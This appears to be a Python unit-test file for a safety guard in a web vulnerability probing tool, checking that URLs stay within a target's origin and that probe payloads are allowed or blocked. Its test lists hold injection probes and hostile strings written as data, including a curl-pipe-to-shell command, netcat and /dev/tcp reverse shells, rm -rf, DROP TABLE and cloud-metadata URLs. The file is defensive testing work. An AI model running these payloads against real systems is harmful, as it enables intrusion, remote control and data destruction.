import unittest

from safety_guard import is_in_scope, normalize_origin, validate_probe_payload


class ScopeTests(unittest.TestCase):
    TARGET = "http://172.17.0.1:8088/app"

    def test_same_origin_in_scope(self):
        self.assertTrue(is_in_scope("http://172.17.0.1:8088/other?q=1", self.TARGET))

    def test_default_port_and_case_equivalence(self):
        self.assertTrue(is_in_scope("https://example.test/a", "https://example.test:443/"))
        self.assertTrue(is_in_scope("http://EXAMPLE.test./a", "http://example.test:80"))

    def test_other_port_host_or_scheme_out_of_scope(self):
        for url in ("http://172.17.0.1:8089/", "https://172.17.0.1:8088/", "http://172.17.0.2:8088/", "http://evil.test/"):
            self.assertFalse(is_in_scope(url, self.TARGET), url)

    def test_userinfo_backslash_space_tricks_rejected(self):
        for url in ("http://172.17.0.1:8088@evil.test/", "http://evil.test\\@172.17.0.1:8088/",
                    "http://172.17.0.1:8088 @evil.test/"):
            self.assertFalse(is_in_scope(url, self.TARGET), url)

    def test_non_http_and_invalid_rejected(self):
        for url in ("file:///etc/passwd", "gopher://172.17.0.1:8088/", "javascript:alert(1)", "", None, 42,
                    "http://host:99999/"):
            self.assertIsNone(normalize_origin(url), url)

    def test_ipv6(self):
        self.assertTrue(is_in_scope("http://[::1]:8080/x", "http://[::1]:8080/"))
        self.assertFalse(is_in_scope("http://[::1]:8081/x", "http://[::1]:8080/"))


class PayloadTests(unittest.TestCase):
    def assertAllowed(self, payload):
        ok, why = validate_probe_payload(payload)
        self.assertTrue(ok, "%r reddedildi: %s" % (payload, why))

    def assertBlocked(self, payload):
        ok, why = validate_probe_payload(payload)
        self.assertFalse(ok, "%r izin verildi" % (payload,))
        self.assertTrue(why)

    def test_benign_read_only_probes_allowed(self):
        for p in ("<script>alert(1)</script>", "' OR '1'='1", "1 AND SLEEP(3)", "{{7*7}}", "${7*7}",
                  "../../../../etc/passwd", ";id", "|whoami", "http://127.0.0.1:80/", "admin'--",
                  "\" onmouseover=\"alert(1)", "1' UNION SELECT NULL,NULL--", "'; WAITFOR DELAY '0:0:3'--",
                  None, ""):
            self.assertAllowed(p)

    def test_destructive_sql_blocked(self):
        for p in ("1; DROP TABLE users--", "1;DROP/**/TABLE users", "%27%3B%20DELETE%20FROM%20users--",
                  "x'; UPDATE users SET role='admin'--", "'; INSERT INTO logs VALUES(1)--",
                  "1; TRUNCATE TABLE sessions", "' UNION SELECT 1 INTO OUTFILE '/tmp/x'--",
                  "'; EXEC xp_cmdshell 'dir'--", "'; SHUTDOWN--", "1; GRANT ALL ON *.* TO x"):
            self.assertBlocked(p)

    def test_destructive_os_and_remote_exec_blocked(self):
        for p in (";rm -rf /", "$(curl http://x.test/a.sh | sh)", "; reboot", "| nc -e /bin/sh 10.0.0.1 4444",
                  "; bash -i >& /dev/tcp/1.2.3.4/80 0>&1", "; mkfs.ext4 /dev/sda1"):
            self.assertBlocked(p)

    def test_dos_delays_blocked(self):
        for p in ("1 AND SLEEP(30)", "1; SELECT pg_sleep(60)", "'; WAITFOR DELAY '0:0:30'--",
                  "BENCHMARK(50000000,MD5(1))", "; sleep 60"):
            self.assertBlocked(p)

    def test_metadata_and_length_blocked(self):
        self.assertBlocked("http://169.254.169.254/latest/meta-data/")
        self.assertBlocked("http://metadata.google.internal/computeMetadata/v1/")
        self.assertBlocked("A" * 3000)


if __name__ == "__main__":
    unittest.main()
